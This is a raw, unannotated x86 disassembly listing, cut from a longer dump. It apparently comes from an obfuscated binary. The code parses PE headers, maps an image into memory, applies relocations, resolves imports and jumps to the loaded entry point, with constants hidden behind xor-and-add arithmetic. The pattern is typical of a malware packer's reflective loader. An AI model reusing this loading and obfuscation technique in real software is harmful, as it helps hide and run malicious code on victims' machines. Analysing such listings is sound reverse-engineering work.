  4255f8:	lea    eax,[ebp-0x8]
  4255fb:	mov    DWORD PTR [ebp-0x4],eax
  4255fe:	mov    edx,DWORD PTR [ebp-0x4]
  425601:	mov    eax,0xf88b0bcb
  425606:	mov    DWORD PTR [edx],eax
  425608:	mov    edx,DWORD PTR [ebp-0x8]
  42560b:	cmp    edx,eax
  42560d:	jne    0x42561e
  42560f:	mov    eax,DWORD PTR [ebp+0x8]
  425612:	mov    BYTE PTR [ecx+0x9],0xf
  425616:	mov    BYTE PTR [eax+0x7],0x58
  42561a:	mov    BYTE PTR [ecx+0x6],0x10
  42561e:	mov    BYTE PTR [ecx+0x3],0x1f
  425622:	leave  
  425623:	ret    0x4
  425626:	push   ebp
  425627:	mov    ebp,esp
  425629:	push   ecx
  42562a:	push   ecx
  42562b:	lea    eax,[ebp-0x8]
  42562e:	mov    DWORD PTR [ebp-0x4],eax
  425631:	mov    edx,DWORD PTR [ebp-0x4]
  425634:	mov    eax,0x7e0da2f
  425639:	mov    DWORD PTR [edx],eax
  42563b:	mov    edx,DWORD PTR [ebp-0x8]
  42563e:	cmp    edx,eax
  425640:	jne    0x425646
  425642:	mov    BYTE PTR [ecx+0x7],0x58
  425646:	mov    eax,DWORD PTR [ebp+0x8]
  425649:	mov    BYTE PTR [ecx+0x1],0x1a
  42564d:	mov    BYTE PTR [eax+0x9],0x2f
  425651:	leave  
  425652:	ret    0x4
  425655:	push   ebp
  425656:	mov    ebp,esp
  425658:	push   ecx
  425659:	push   ecx
  42565a:	lea    eax,[ebp-0x8]
  42565d:	mov    DWORD PTR [ebp-0x4],eax
  425660:	push   esi
  425661:	mov    esi,DWORD PTR [ebp-0x4]
  425664:	mov    eax,0x7060e3e
  425669:	mov    DWORD PTR [esi],eax
  42566b:	mov    esi,DWORD PTR [ebp-0x8]
  42566e:	cmp    esi,eax
  425670:	pop    esi
  425671:	jne    0x42567d
  425673:	mov    BYTE PTR [edx+0x4],0x14
  425677:	mov    WORD PTR [ecx+0x3],0x141f
  42567d:	mov    BYTE PTR [edx],0x40
  425680:	leave  
  425681:	ret    
  425682:	push   ebp
  425683:	mov    ebp,esp
  425685:	push   ecx
  425686:	push   ecx
  425687:	lea    eax,[ebp-0x8]
  42568a:	mov    DWORD PTR [ebp-0x4],eax
  42568d:	mov    edx,DWORD PTR [ebp-0x4]
  425690:	mov    eax,0xf8870b3f
  425695:	mov    DWORD PTR [edx],eax
  425697:	mov    edx,DWORD PTR [ebp-0x8]
  42569a:	cmp    edx,eax
  42569c:	jne    0x4256a9
  42569e:	mov    eax,DWORD PTR [ebp+0x8]
  4256a1:	mov    BYTE PTR [ecx+0x8],0x10
  4256a5:	mov    BYTE PTR [eax+0x1],0x1a
  4256a9:	mov    BYTE PTR [ecx+0x5],0xc
  4256ad:	leave  
  4256ae:	ret    0x4
  4256b1:	push   esi
  4256b2:	mov    ecx,edi
  4256b4:	call   0x425682
  4256b9:	mov    edx,edi
  4256bb:	mov    ecx,esi
  4256bd:	mov    BYTE PTR [esi],0x20
  4256c0:	call   0x425655
  4256c5:	push   esi
  4256c6:	mov    ecx,edi
  4256c8:	mov    BYTE PTR [esi+0x5],0xc
  4256cc:	call   0x425626
  4256d1:	push   esi
  4256d2:	mov    BYTE PTR [esi+0x6],0x10
  4256d6:	call   0x4255f3
  4256db:	mov    BYTE PTR [esi+0x2],0x15
  4256df:	mov    edx,esi
  4256e1:	jmp    0x4255c3
  4256e6:	push   ebp
  4256e7:	mov    ebp,esp
  4256e9:	push   ecx
  4256ea:	mov    ecx,DWORD PTR [edx+0x194]
  4256f0:	push   esi
  4256f1:	mov    esi,DWORD PTR [ebp+0x8]
  4256f4:	mov    esi,DWORD PTR [esi]
  4256f6:	mov    DWORD PTR [ecx],esi
  4256f8:	mov    ecx,DWORD PTR [edx+0x194]
  4256fe:	mov    ecx,DWORD PTR [ecx]
  425700:	mov    esi,DWORD PTR [edx+0x190]
  425706:	mov    DWORD PTR [esi],ecx
  425708:	mov    eax,DWORD PTR [edx+0x194]
  42570e:	mov    ecx,DWORD PTR [eax]
  425710:	mov    ecx,DWORD PTR [ecx+0x3c]
  425713:	add    ecx,DWORD PTR [eax]
  425715:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  42571c:	mov    eax,DWORD PTR [ebp-0x4]
  42571f:	movzx  ecx,WORD PTR [ecx+0x16]
  425723:	xor    eax,0x75108af
  425728:	add    eax,0x3272f6
  42572d:	pop    esi
  42572e:	test   ecx,eax
  425730:	je     0x42573e
  425732:	mov    eax,DWORD PTR [edx+0x1c8]
  425738:	mov    DWORD PTR [eax],0xf89c85a4
  42573e:	leave  
  42573f:	ret    0x4
  425742:	push   ebp
  425743:	mov    ebp,esp
  425745:	sub    esp,0x70
  425748:	and    DWORD PTR [ebp-0x20],0x0
  42574c:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  425753:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  42575a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  425761:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425768:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  42576f:	mov    eax,DWORD PTR [ebp+0x20]
  425772:	mov    eax,DWORD PTR [eax+0x194]
  425778:	mov    DWORD PTR [ebp-0xc],eax
  42577b:	mov    eax,DWORD PTR [ebp+0x20]
  42577e:	push   ebx
  42577f:	push   esi
  425780:	mov    esi,DWORD PTR [eax+0x190]
  425786:	mov    eax,DWORD PTR [ebp+0x20]
  425789:	mov    eax,DWORD PTR [eax+0x18c]
  42578f:	mov    DWORD PTR [ebp-0x8],eax
  425792:	mov    eax,DWORD PTR [eax]
  425794:	push   edi
  425795:	mov    DWORD PTR [ebp-0x4],esi
  425798:	test   eax,eax
  42579a:	jne    0x4257a7
  42579c:	push   DWORD PTR [ebp+0x1c]
  42579f:	mov    edx,DWORD PTR [ebp+0x20]
  4257a2:	call   0x4256e6
  4257a7:	mov    eax,DWORD PTR [esi]
  4257a9:	mov    ebx,DWORD PTR [esi]
  4257ab:	add    ebx,DWORD PTR [eax+0x3c]
  4257ae:	mov    eax,DWORD PTR [ebp+0xc]
  4257b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4257b4:	mov    ecx,DWORD PTR [ecx]
  4257b6:	mov    esi,0x75108af
  4257bb:	xor    eax,esi
  4257bd:	mov    edi,0x3272f6
  4257c2:	add    eax,edi
  4257c4:	cmp    eax,ecx
  4257c6:	jne    0x4259fe
  4257cc:	mov    eax,DWORD PTR [ebp-0xc]
  4257cf:	mov    eax,DWORD PTR [eax]
  4257d1:	mov    DWORD PTR [ebp-0x10],eax
  4257d4:	mov    eax,DWORD PTR [ebx+0x50]
  4257d7:	mov    DWORD PTR [ebp-0x68],eax
  4257da:	mov    eax,DWORD PTR [ebp-0x18]
  4257dd:	xor    eax,esi
  4257df:	add    eax,edi
  4257e1:	mov    DWORD PTR [ebp-0x64],eax
  4257e4:	mov    eax,DWORD PTR [ebp-0x14]
  4257e7:	and    DWORD PTR [ebp-0x6c],0x0
  4257eb:	xor    eax,esi
  4257ed:	add    eax,edi
  4257ef:	mov    DWORD PTR [ebp-0x60],eax
  4257f2:	lea    eax,[ebp-0x70]
  4257f5:	push   eax
  4257f6:	mov    eax,DWORD PTR [ebp+0x8]
  4257f9:	xor    eax,esi
  4257fb:	add    eax,edi
  4257fd:	push   eax
  4257fe:	mov    eax,DWORD PTR [ebp+0x20]
  425801:	add    eax,0xaa
  425806:	push   eax
  425807:	mov    eax,DWORD PTR [ebp+0x20]
  42580a:	mov    eax,DWORD PTR [eax+0x198]
  425810:	mov    DWORD PTR [ebp-0x70],0x4
  425817:	push   DWORD PTR [eax]
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	call   eax
  42581e:	mov    ecx,DWORD PTR [ebp-0xc]
  425821:	mov    ecx,DWORD PTR [ecx]
  425823:	mov    edx,DWORD PTR [ebp-0x8]
  425826:	mov    DWORD PTR [ebp-0x6c],eax
  425829:	mov    DWORD PTR [ebp+0x1c],eax
  42582c:	mov    DWORD PTR [edx],ecx
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    DWORD PTR [ecx],eax
  425833:	mov    eax,DWORD PTR [ebx+0x50]
  425836:	mov    DWORD PTR [ebp-0x68],eax
  425839:	mov    eax,DWORD PTR [ebp-0x1c]
  42583c:	xor    eax,esi
  42583e:	add    eax,edi
  425840:	mov    DWORD PTR [ebp-0x64],eax
  425843:	lea    eax,[ebp-0x20]
  425846:	mov    DWORD PTR [ebp-0x60],eax
  425849:	lea    eax,[ebp-0x70]
  42584c:	push   eax
  42584d:	mov    eax,DWORD PTR [ebp+0x8]
  425850:	xor    eax,esi
  425852:	add    eax,edi
  425854:	push   eax
  425855:	mov    eax,DWORD PTR [ebp+0x20]
  425858:	add    eax,0xee
  42585d:	push   eax
  42585e:	mov    eax,DWORD PTR [ebp+0x20]
  425861:	mov    eax,DWORD PTR [eax+0x198]
  425867:	mov    DWORD PTR [ebp-0x70],0x4
  42586e:	push   DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x10]
  425873:	call   eax
  425875:	test   eax,eax
  425877:	je     0x42589c
  425879:	and    DWORD PTR [ebp+0xc],0x0
  42587d:	cmp    DWORD PTR [ebx+0x50],0x0
  425881:	jbe    0x42589c
  425883:	mov    eax,DWORD PTR [ebp+0x1c]
  425886:	mov    ecx,DWORD PTR [ebp-0x10]
  425889:	sub    ecx,eax
  42588b:	mov    dl,BYTE PTR [ecx+eax*1]
  42588e:	inc    DWORD PTR [ebp+0xc]
  425891:	mov    BYTE PTR [eax],dl
  425893:	mov    edx,DWORD PTR [ebp+0xc]
  425896:	inc    eax
  425897:	cmp    edx,DWORD PTR [ebx+0x50]
  42589a:	jb     0x42588b
  42589c:	mov    edx,DWORD PTR [ebp+0x1c]
  42589f:	mov    ecx,DWORD PTR [edx+0x3c]
  4258a2:	add    ecx,edx
  4258a4:	mov    eax,DWORD PTR [ecx+0xa0]
  4258aa:	mov    ebx,DWORD PTR [ecx+0x28]
  4258ad:	add    eax,edx
  4258af:	sub    edx,DWORD PTR [ebp-0x10]
  4258b2:	add    ebx,DWORD PTR [ebp+0x1c]
  4258b5:	mov    DWORD PTR [ebp+0xc],edx
  4258b8:	mov    DWORD PTR [ebp-0x2c],ecx
  4258bb:	mov    DWORD PTR [ebp-0x14],ebx
  4258be:	mov    DWORD PTR [ebp-0x8],0x0
  4258c5:	jmp    0x425941
  4258c7:	add    edx,0xfffffff8
  4258ca:	shr    edx,1
  4258cc:	mov    DWORD PTR [ebp-0x18],edx
  4258cf:	je     0x42592d
  4258d1:	lea    edx,[eax+0x8]
  4258d4:	mov    DWORD PTR [ebp-0x4],edx
  4258d7:	mov    edx,DWORD PTR [ebp-0x18]
  4258da:	mov    DWORD PTR [ebp-0x18],edx
  4258dd:	mov    edx,DWORD PTR [ebp-0x4]
  4258e0:	movzx  edx,WORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp-0x24],edx
  4258e6:	and    edx,0xfff
  4258ec:	mov    DWORD PTR [ebp-0x28],edx
  4258ef:	mov    edx,DWORD PTR [ebp-0x24]
  4258f2:	shr    edx,0xc
  4258f5:	add    edx,0xffcd8d0a
  4258fb:	xor    edx,esi
  4258fd:	cmp    edx,0xf89c85a2
  425903:	jne    0x425924
  425905:	mov    edx,DWORD PTR [ebp-0x28]
  425908:	add    edx,DWORD PTR [ebp+0x1c]
  42590b:	mov    ebx,DWORD PTR [eax]
  42590d:	cmp    DWORD PTR [ebx+edx*1],0x0
  425911:	je     0x425921
  425913:	mov    ecx,DWORD PTR [ebp+0xc]
  425916:	add    ecx,DWORD PTR [ebx+edx*1]
  425919:	mov    ebx,DWORD PTR [eax]
  42591b:	mov    DWORD PTR [edx+ebx*1],ecx
  42591e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425921:	mov    ebx,DWORD PTR [ebp-0x14]
  425924:	add    DWORD PTR [ebp-0x4],0x2
  425928:	dec    DWORD PTR [ebp-0x18]
  42592b:	jne    0x4258dd
  42592d:	mov    edx,DWORD PTR [ebp-0xc]
  425930:	add    DWORD PTR [ebp-0x8],edx
  425933:	mov    edx,DWORD PTR [ebp-0x8]
  425936:	cmp    edx,DWORD PTR [ecx+0xa4]
  42593c:	jae    0x42594f
  42593e:	add    eax,DWORD PTR [ebp-0xc]
  425941:	mov    edx,DWORD PTR [eax+0x4]
  425944:	mov    DWORD PTR [ebp-0xc],edx
  425947:	test   edx,edx
  425949:	jne    0x4258c7
  42594f:	mov    eax,DWORD PTR [ebp-0x10]
  425952:	mov    DWORD PTR [ebp-0x6c],eax
  425955:	mov    DWORD PTR [ebp-0x70],0x4
  42595c:	mov    eax,DWORD PTR [ecx+0x50]
  42595f:	mov    DWORD PTR [ebp-0x68],eax
  425962:	mov    eax,DWORD PTR [ebp-0x1c]
  425965:	xor    eax,esi
  425967:	add    eax,edi
  425969:	mov    DWORD PTR [ebp-0x64],eax
  42596c:	lea    eax,[ebp-0x20]
  42596f:	mov    DWORD PTR [ebp-0x60],eax
  425972:	lea    eax,[ebp-0x70]
  425975:	push   eax
  425976:	mov    eax,DWORD PTR [ebp+0x8]
  425979:	xor    eax,esi
  42597b:	add    eax,edi
  42597d:	push   eax
  42597e:	mov    eax,DWORD PTR [ebp+0x20]
  425981:	add    eax,0xee
  425986:	push   eax
  425987:	mov    eax,DWORD PTR [ebp+0x20]
  42598a:	mov    eax,DWORD PTR [eax+0x198]
  425990:	push   DWORD PTR [eax]
  425992:	mov    eax,DWORD PTR [ebp+0x10]
  425995:	call   eax
  425997:	mov    eax,DWORD PTR [ebp+0x20]
  42599a:	mov    eax,DWORD PTR [eax+0x180]
  4259a0:	add    eax,DWORD PTR [ebp+0xc]
  4259a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259a6:	push   DWORD PTR [ebp+0x18]
  4259a9:	mov    DWORD PTR [eax],ecx
  4259ab:	push   DWORD PTR [ebp+0x14]
  4259ae:	push   DWORD PTR [ebp+0x1c]
  4259b1:	call   ebx
  4259b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b6:	add    ecx,DWORD PTR [ebp+0x20]
  4259b9:	lea    eax,[ebp+0x4]
  4259bc:	mov    DWORD PTR [ebp+0x20],ecx
  4259bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c2:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c5:	mov    edx,DWORD PTR [ecx+0x190]
  4259cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4259ce:	mov    ecx,DWORD PTR [ecx+0x18c]
  4259d4:	mov    esi,DWORD PTR [ecx]
  4259d6:	cmp    DWORD PTR [eax],esi
  4259d8:	jb     0x4259f9
  4259da:	mov    esi,DWORD PTR [edx]
  4259dc:	mov    edi,DWORD PTR [edx]
  4259de:	mov    esi,DWORD PTR [esi+0x3c]
  4259e1:	lea    esi,[edi+esi*1+0x50]
  4259e5:	mov    edi,DWORD PTR [ecx]
  4259e7:	add    edi,DWORD PTR [esi]
  4259e9:	cmp    DWORD PTR [eax],edi
  4259eb:	jae    0x4259f9
  4259ed:	mov    esi,DWORD PTR [ecx]
  4259ef:	mov    ecx,DWORD PTR [eax]
  4259f1:	mov    edx,DWORD PTR [edx]
  4259f3:	sub    ecx,esi
  4259f5:	add    edx,ecx
  4259f7:	mov    DWORD PTR [eax],edx
  4259f9:	mov    eax,DWORD PTR [ebp+0xc]
  4259fc:	jmp    0x425a00
  4259fe:	xor    eax,eax
  425a00:	pop    edi
  425a01:	pop    esi
  425a02:	pop    ebx
  425a03:	leave  
  425a04:	ret    0x1c
  425a07:	push   ebp
  425a08:	mov    ebp,esp
  425a0a:	sub    esp,0x1c
  425a0d:	push   esi
  425a0e:	mov    esi,eax
  425a10:	mov    eax,DWORD PTR [ecx+0x190]
  425a16:	cmp    DWORD PTR [eax],0x0
  425a19:	je     0x425b29
  425a1f:	test   edx,edx
  425a21:	je     0x425b29
  425a27:	test   esi,esi
  425a29:	je     0x425b29
  425a2f:	mov    eax,DWORD PTR [esi+0x88]
  425a35:	test   eax,eax
  425a37:	je     0x425b24
  425a3d:	cmp    DWORD PTR [esi+0x8c],0x10
  425a44:	je     0x425b24
  425a4a:	cmp    DWORD PTR [esi+0x34],edx
  425a4d:	je     0x425b24
  425a53:	mov    esi,DWORD PTR [ecx+0x18c]
  425a59:	and    DWORD PTR [ebp-0x10],0x0
  425a5d:	mov    ecx,edx
  425a5f:	sub    ecx,DWORD PTR [esi]
  425a61:	add    eax,edx
  425a63:	movzx  edx,WORD PTR [eax+0xc]
  425a67:	mov    DWORD PTR [ebp-0x1c],ecx
  425a6a:	movzx  ecx,WORD PTR [eax+0xe]
  425a6e:	add    ecx,edx
  425a70:	je     0x425b24
  425a76:	lea    ecx,[eax+0x14]
  425a79:	push   ebx
  425a7a:	mov    DWORD PTR [ebp-0x18],ecx
  425a7d:	mov    esi,0x7fffffff
  425a82:	push   edi
  425a83:	test   DWORD PTR [ecx],esi
  425a85:	je     0x425b06
  425a87:	mov    edx,DWORD PTR [ecx]
  425a89:	and    DWORD PTR [ebp-0xc],0x0
  425a8d:	and    edx,esi
  425a8f:	add    edx,eax
  425a91:	movzx  edi,WORD PTR [edx+0xe]
  425a95:	movzx  ebx,WORD PTR [edx+0xc]
  425a99:	add    edi,ebx
  425a9b:	je     0x425b06
  425a9d:	lea    ecx,[edx+0x14]
  425aa0:	mov    DWORD PTR [ebp-0x14],ecx
  425aa3:	test   DWORD PTR [ecx],esi
  425aa5:	je     0x425ae8
  425aa7:	mov    ecx,DWORD PTR [ecx]
  425aa9:	and    DWORD PTR [ebp-0x8],0x0
  425aad:	and    ecx,esi
  425aaf:	add    ecx,eax
  425ab1:	movzx  edi,WORD PTR [ecx+0xe]
  425ab5:	movzx  ebx,WORD PTR [ecx+0xc]
  425ab9:	add    edi,ebx
  425abb:	je     0x425ae8
  425abd:	lea    edi,[ecx+0x14]
  425ac0:	mov    DWORD PTR [ebp-0x4],edi
  425ac3:	mov    edi,DWORD PTR [ebp-0x4]
  425ac6:	mov    edi,DWORD PTR [edi]
  425ac8:	test   edi,edi
  425aca:	je     0x425ad2
  425acc:	mov    ebx,DWORD PTR [ebp-0x1c]
  425acf:	add    DWORD PTR [edi+eax*1],ebx
  425ad2:	movzx  edi,WORD PTR [ecx+0xe]
  425ad6:	movzx  ebx,WORD PTR [ecx+0xc]
  425ada:	inc    DWORD PTR [ebp-0x8]
  425add:	add    DWORD PTR [ebp-0x4],0x8
  425ae1:	add    edi,ebx
  425ae3:	cmp    DWORD PTR [ebp-0x8],edi
  425ae6:	jb     0x425ac3
  425ae8:	movzx  edi,WORD PTR [edx+0xe]
  425aec:	movzx  ebx,WORD PTR [edx+0xc]
  425af0:	mov    ecx,DWORD PTR [ebp-0x14]
  425af3:	inc    DWORD PTR [ebp-0xc]
  425af6:	add    ecx,0x8
  425af9:	add    edi,ebx
  425afb:	mov    DWORD PTR [ebp-0x14],ecx
  425afe:	cmp    DWORD PTR [ebp-0xc],edi
  425b01:	jb     0x425aa3
  425b03:	mov    ecx,DWORD PTR [ebp-0x18]
  425b06:	movzx  edx,WORD PTR [eax+0xe]
  425b0a:	movzx  edi,WORD PTR [eax+0xc]
  425b0e:	inc    DWORD PTR [ebp-0x10]
  425b11:	add    ecx,0x8
  425b14:	add    edx,edi
  425b16:	mov    DWORD PTR [ebp-0x18],ecx
  425b19:	cmp    DWORD PTR [ebp-0x10],edx
  425b1c:	jb     0x425a83
  425b22:	pop    edi
  425b23:	pop    ebx
  425b24:	xor    eax,eax
  425b26:	inc    eax
  425b27:	jmp    0x425b2b
  425b29:	xor    eax,eax
  425b2b:	pop    esi
  425b2c:	leave  
  425b2d:	ret    
  425b2e:	push   ebp
  425b2f:	mov    ebp,esp
  425b31:	mov    ecx,DWORD PTR [ecx+0x190]
  425b37:	mov    eax,DWORD PTR [ebp+0xc]
  425b3a:	sub    esp,0x10
  425b3d:	push   ebx
  425b3e:	xor    ebx,ebx
  425b40:	push   esi
  425b41:	push   edi
  425b42:	cmp    DWORD PTR [ecx],ebx
  425b44:	je     0x425bcc
  425b4a:	cmp    eax,ebx
  425b4c:	je     0x425bcc
  425b4e:	cmp    DWORD PTR [eax+0x78],ebx
  425b51:	jne    0x425b58
  425b53:	xor    eax,eax
  425b55:	inc    eax
  425b56:	jmp    0x425bce
  425b58:	mov    eax,DWORD PTR [eax+0x78]
  425b5b:	add    eax,DWORD PTR [ebp+0x8]
  425b5e:	mov    ecx,DWORD PTR [eax+0x1c]
  425b61:	mov    edx,DWORD PTR [eax+0x24]
  425b64:	mov    esi,DWORD PTR [eax+0x14]
  425b67:	mov    edi,DWORD PTR [eax+0x18]
  425b6a:	add    ecx,DWORD PTR [ebp+0x8]
  425b6d:	add    edx,DWORD PTR [ebp+0x8]
  425b70:	mov    DWORD PTR [ebp-0x4],esi
  425b73:	cmp    esi,edi
  425b75:	ja     0x425b7a
  425b77:	mov    DWORD PTR [ebp-0x4],edi
  425b7a:	mov    DWORD PTR [ebp-0x8],ebx
  425b7d:	cmp    DWORD PTR [ebp-0x4],ebx
  425b80:	jbe    0x425b53
  425b82:	cmp    ebx,DWORD PTR [eax+0x14]
  425b85:	jae    0x425b8d
  425b87:	movzx  esi,WORD PTR [edx+ebx*2]
  425b8b:	jmp    0x425b8f
  425b8d:	mov    esi,ebx
  425b8f:	lea    esi,[ecx+esi*4]
  425b92:	mov    edi,DWORD PTR [esi]
  425b94:	test   edi,edi
  425b96:	je     0x425bc1
  425b98:	add    edi,DWORD PTR [ebp+0x8]
  425b9b:	mov    DWORD PTR [ebp-0x10],edi
  425b9e:	cmp    edi,eax
  425ba0:	jbe    0x425bb2
  425ba2:	mov    ebx,DWORD PTR [ebp+0xc]
  425ba5:	mov    ebx,DWORD PTR [ebx+0x7c]
  425ba8:	add    ebx,eax
  425baa:	cmp    edi,ebx
  425bac:	jae    0x425bb2
  425bae:	mov    esi,DWORD PTR [esi]
  425bb0:	jmp    0x425bba
  425bb2:	sub    edi,DWORD PTR [ebp+0x8]
  425bb5:	mov    DWORD PTR [esi],edi
  425bb7:	mov    esi,DWORD PTR [ebp-0x10]
  425bba:	test   esi,esi
  425bbc:	je     0x425bcc
  425bbe:	mov    ebx,DWORD PTR [ebp-0x8]
  425bc1:	inc    ebx
  425bc2:	mov    DWORD PTR [ebp-0x8],ebx
  425bc5:	cmp    ebx,DWORD PTR [ebp-0x4]
  425bc8:	jb     0x425b82
  425bca:	jmp    0x425b53
  425bcc:	xor    eax,eax
  425bce:	pop    edi
  425bcf:	pop    esi
  425bd0:	pop    ebx
  425bd1:	leave  
  425bd2:	ret    0x8
  425bd5:	push   ebp
  425bd6:	mov    ebp,esp
  425bd8:	sub    esp,0x2c
  425bdb:	mov    edx,0xf89c85a5
  425be0:	mov    DWORD PTR [ebp-0x4],edx
  425be3:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  425bea:	mov    eax,DWORD PTR [ebp-0x4]
  425bed:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf0:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  425bfc:	push   ebx
  425bfd:	mov    ebx,DWORD PTR [ebp+0x10]
  425c00:	push   esi
  425c01:	mov    esi,0x75108af
  425c06:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  425c0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425c10:	mov    ebx,DWORD PTR [ebx+0x190]
  425c16:	push   edi
  425c17:	mov    edi,0x3272f6
  425c1c:	xor    ecx,esi
  425c1e:	xor    eax,esi
  425c20:	add    eax,edi
  425c22:	add    ecx,edi
  425c24:	mov    DWORD PTR [ebp-0x18],eax
  425c27:	cmp    ecx,DWORD PTR [ebx]
  425c29:	je     0x425eaa
  425c2f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c32:	mov    ecx,DWORD PTR [ebp+0xc]
  425c35:	xor    ebx,esi
  425c37:	add    ebx,edi
  425c39:	cmp    ebx,ecx
  425c3b:	je     0x425eaa
  425c41:	mov    ebx,DWORD PTR [ebp-0x4]
  425c44:	mov    ecx,DWORD PTR [ecx+0x80]
  425c4a:	xor    ebx,esi
  425c4c:	add    ebx,edi
  425c4e:	cmp    ecx,ebx
  425c50:	je     0x425ea5
  425c56:	add    ecx,DWORD PTR [ebp+0x8]
  425c59:	mov    DWORD PTR [ebp-0x2c],ecx
  425c5c:	mov    ebx,edx
  425c5e:	xor    ebx,esi
  425c60:	add    ebx,edi
  425c62:	mov    DWORD PTR [ebp-0x10],ebx
  425c65:	mov    ebx,DWORD PTR [ebp-0x10]
  425c68:	cmp    ebx,edx
  425c6a:	je     0x425c7e
  425c6c:	mov    edx,DWORD PTR [ebp-0x10]
  425c6f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c72:	imul   edx,edx,0x14
  425c75:	xor    ebx,esi
  425c77:	add    ebx,edi
  425c79:	cmp    DWORD PTR [edx+ecx*1],ebx
  425c7c:	jne    0x425c95
  425c7e:	mov    edx,DWORD PTR [ebp-0x10]
  425c81:	mov    ebx,DWORD PTR [ebp-0x4]
  425c84:	imul   edx,edx,0x14
  425c87:	xor    ebx,esi
  425c89:	add    ebx,edi
  425c8b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425c8f:	je     0x425e97
  425c95:	mov    eax,DWORD PTR [ebp-0x4]
  425c98:	mov    ebx,DWORD PTR [ebp-0x4]
  425c9b:	mov    eax,DWORD PTR [ebp-0x10]
  425c9e:	imul   eax,eax,0x14
  425ca1:	add    eax,ecx
  425ca3:	mov    ecx,DWORD PTR [eax+0x10]
  425ca6:	add    ecx,DWORD PTR [ebp+0x8]
  425ca9:	xor    ebx,esi
  425cab:	mov    DWORD PTR [ebp-0x1c],ecx
  425cae:	mov    ecx,DWORD PTR [ebp-0x4]
  425cb1:	mov    edx,DWORD PTR [ebp-0x4]
  425cb4:	xor    ecx,esi
  425cb6:	add    ecx,edi
  425cb8:	xor    edx,esi
  425cba:	mov    DWORD PTR [ebp-0x24],ecx
  425cbd:	mov    ecx,DWORD PTR [eax]
  425cbf:	add    edx,edi
  425cc1:	add    ebx,edi
  425cc3:	cmp    ecx,edx
  425cc5:	je     0x425ccd
  425cc7:	add    ecx,DWORD PTR [ebp+0x8]
  425cca:	mov    DWORD PTR [ebp-0x24],ecx
  425ccd:	mov    ecx,DWORD PTR [ebp-0x4]
  425cd0:	xor    ecx,esi
  425cd2:	add    ecx,DWORD PTR [eax+0xc]
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    eax,[ecx+eax*1+0x3272f6]
  425cdf:	mov    DWORD PTR [ebp+0xc],eax
  425ce2:	mov    DWORD PTR [ebp-0x28],0xf89c85a0
  425ce9:	mov    eax,DWORD PTR [ebp+0x10]
  425cec:	push   DWORD PTR [ebp+0xc]
  425cef:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf5:	call   DWORD PTR [eax]
  425cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  425cfa:	xor    ecx,esi
  425cfc:	add    ecx,edi
  425cfe:	mov    DWORD PTR [ebp-0xc],eax
  425d01:	cmp    ecx,eax
  425d03:	jne    0x425d17
  425d05:	mov    eax,DWORD PTR [ebp+0x10]
  425d08:	push   DWORD PTR [ebp+0xc]
  425d0b:	mov    eax,DWORD PTR [eax+0x1e0]
  425d11:	call   DWORD PTR [eax+0xc]
  425d14:	mov    DWORD PTR [ebp-0xc],eax
  425d17:	mov    DWORD PTR [ebp-0x20],0x7f661b2c
  425d1e:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  425d25:	mov    eax,DWORD PTR [ebp-0x4]
  425d28:	xor    eax,esi
  425d2a:	add    eax,edi
  425d2c:	cmp    eax,DWORD PTR [ebp-0xc]
  425d2f:	jne    0x425d54
  425d31:	mov    eax,DWORD PTR [ebp-0x8]
  425d34:	mov    ecx,DWORD PTR [ebp-0x20]
  425d37:	xor    eax,esi
  425d39:	xor    ecx,esi
  425d3b:	lea    ebx,[ebx+eax*1+0x3272f6]
  425d42:	mov    eax,DWORD PTR [ebp+0x10]
  425d45:	mov    eax,DWORD PTR [eax+0x1e0]
  425d4b:	add    ecx,edi
  425d4d:	imul   ecx,ebx
  425d50:	push   ecx
  425d51:	call   DWORD PTR [eax+0x24]
  425d54:	mov    eax,DWORD PTR [ebp-0x4]
  425d57:	xor    eax,esi
  425d59:	add    eax,edi
  425d5b:	cmp    eax,DWORD PTR [ebp-0xc]
  425d5e:	jne    0x425d6f
  425d60:	mov    eax,DWORD PTR [ebp-0x28]
  425d63:	xor    eax,esi
  425d65:	add    eax,edi
  425d67:	cmp    ebx,eax
  425d69:	jbe    0x425ce9
  425d6f:	mov    eax,DWORD PTR [ebp-0x4]
  425d72:	xor    eax,esi
  425d74:	add    eax,edi
  425d76:	cmp    eax,DWORD PTR [ebp-0xc]
  425d79:	jne    0x425d92
  425d7b:	mov    eax,DWORD PTR [ebp-0x8]
  425d7e:	mov    ecx,DWORD PTR [ebp-0x18]
  425d81:	xor    eax,esi
  425d83:	lea    eax,[ecx+eax*1+0x3272f6]
  425d8a:	mov    DWORD PTR [ebp-0x18],eax
  425d8d:	jmp    0x425e81
  425d92:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  425d99:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  425da0:	mov    ebx,DWORD PTR [ebp-0x4]
  425da3:	xor    ebx,esi
  425da5:	add    ebx,edi
